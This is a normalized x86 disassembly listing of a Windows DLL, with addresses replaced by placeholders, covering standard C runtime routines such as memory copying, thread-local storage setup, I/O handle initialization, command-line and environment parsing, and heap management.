pop edi
pop ebp
jmp sub_10030168
jmp [ ecx * 4 + jump_table_1002ba50 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1002b954 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002ba50 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1002b8b4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1002ba50 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002b8b4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002b8b4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002b8b4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002ba50 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002ba50 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002ba50 ]
sub_1002baad
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_10027aa8
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_1002bb28
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_10027aa8
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_1002bba3
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_1002bb28
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1002bbd7
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_1002bb28
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_10024aba
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1002bc14
push 0xc
push r--data
call sub_1002ca38
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_10027aa8
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_1002d1b0
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002bce9
push 0xc
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_100286cc
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002bcf2
call sub_1002ca7d
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1002bcfb
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1002bba3
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_1002a045
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1002bb28
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_10024aba
pop ecx
xor esi esi
push 0x0
push esi
call sub_1002bc14
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1002bd8e
push 0x8
push r--data
call sub_1002ca38
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1002ca7d
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_10024aba
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_10024aba
pop ecx
push 0xd
call sub_1002d1b0
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_10024aba
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002bea8
push 0xc
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002beb4
push esi
call sub_10024aba
pop ecx
push edi
call sub_1002875b
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_10024aba
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_10028583
pop ecx
sub_1002bebd
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_1002bb28
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_1002bd8e
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1002bf2c
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_10027aa8
pop ecx
call sub_1002bbd7
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1002bb9a
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_10027d83
push [ rw-data ]
call sub_1002baad
push [ rw-data ]
mov [ rw-data ] eax
call sub_1002baad
push [ rw-data ]
mov [ rw-data ] eax
call sub_1002baad
push [ rw-data ]
mov [ rw-data ] eax
call sub_1002baad
add esp 0x10
mov [ rw-data ] eax
call sub_1002d034
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_1002bd8e
push [ rw-data ]
call sub_1002bb28
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_1002a045
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1002bb28
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1002bc14
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_1002c0b9
push 0x54
push r--data
call sub_1002ca38
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_1002a045
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_1002a045
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_1002ca7d
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10031992
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10031992
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_1002c30d
mov edi edi
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_10024aba
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x40
add eax 0x800
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_1002c35b
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1003147b
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_1002a045
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10024630
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10024630
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_10024aba
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_1002a045
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_10024aba
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
sub_1002c439
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_1003585e
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_1003585e
pop ecx
test eax eax
je r-xdata
call sub_1003585e
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_1002c5d3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1003147b
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_1002c439
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_1002a000
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_1002c439
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1002c68e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_1002a000
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_1002a000
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_10026f10
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_10024aba
pop ecx
mov [ ebp - 0x4 ] ebx
sub_1002c7c5
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1002c7eb
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1002c811
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_1002c841
cmp [ rw-data ] 0x3
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov edi [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call edi
pop edi
pop ebx
push esi
mov esi [ rw-data ]
add esi 0x10
push 0x8000
push 0x0
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push 0x0
push [ rw-data ]
call edi
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop esi
sub_1002c8b5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_1002bcfb
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
